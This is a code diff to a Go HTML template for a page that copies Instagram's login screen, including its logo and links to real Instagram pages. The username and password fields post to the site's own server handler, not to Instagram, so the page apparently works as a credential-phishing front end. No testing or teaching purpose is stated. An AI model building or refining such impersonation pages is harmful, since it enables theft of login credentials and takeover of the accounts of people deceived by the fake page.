@@ -1,55 +1,32 @@
 {{template "base" .}}
 
-
-<html>
-<head>
-    <title>Instagram</title>
-    <meta charset="utf-8">
-    <meta name="viewport" content=" width=device-width,initial-scale=1.0">
-    <meta http-equiv="refresh" content="60">
-    <link rel="icon" href="../images/favicon.png" type="image/icon">
-    <link rel="stylesheet" type="text/css" href="style.css">
-
-</head>
 {{define "content"}}
-<body>
-    <div class="container">
-        <div class="page">
-            <div class="logo">
-
-                <img src="../images/instagram.png" alt="instagram" style="width: 175px; ">
-            </div>
-
+ <div class="container">
+    <div class="page">
+        <div class="logo">
+            <img src="../static/images/instagram.png" alt="instagram" style="width: 175px;">
+        </div>
+        <br />
+        <form class="container" action="../cmd/web/main.go" method="post">
+            <input type="text" placeholder="Phone number, username, or email" name="u_name">
+            <input type="password" placeholder="Password" name="pass">
+            <button class="submitbutton">Log in</button>
             <br />
-            <form class="container" action="../cmd/web/main.go" method="post">
-                <input type="text" placeholder="Phone number, username, or email " name="u_name">
-                <input type="password" placeholder="Password" name="pass">
-                <button class="submitbutton">Log in </button>
-                <br />
-                <div class="option">OR </div>
-            </form>
-
-            <div class="fblink">
-                <span class="fab fafacebook"></span>
-                <a href="https://www.facebook.com"> Log in With Facebook</a>
-            </div>
-
-            <div class="forget-id">
-                <a href="https://www.instagram.com/accounts/password/reset/">Forget password?</a>
-            </div>
-            <div class="singup">
-                <p>Don't have an account?<a href="https://www.instagram.com/accounts/emailsignup/">
-                        Sign up</a></p>
-            </div>
-
+            <div class="option">OR</div>
+        </form>
+        <div class="fblink">
+            <span class="fab facebook"></span>
+            <a href="https://www.facebook.com">Log in With Facebook</a>
+        </div>
+        <div class="forget-id">
+            <a href="https://www.instagram.com/accounts/password/reset/">Forget password?</a>
+        </div>
+        <div class="singup">
+            <p>Don't have an account?<a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a></p>
         </div>
     </div>
-
-    <br />
-    <div style="position:fixed;left:0;bottom:0;width:100%; color: #7e7979;">
-    </div>
-    <br />
-
-</body>
+</div>
+ <br />
+ <div style="position:fixed;left:0;bottom:0;width:100%;color: #7e7979;"></div>
+ <br/>
 {{end}}
-</html>
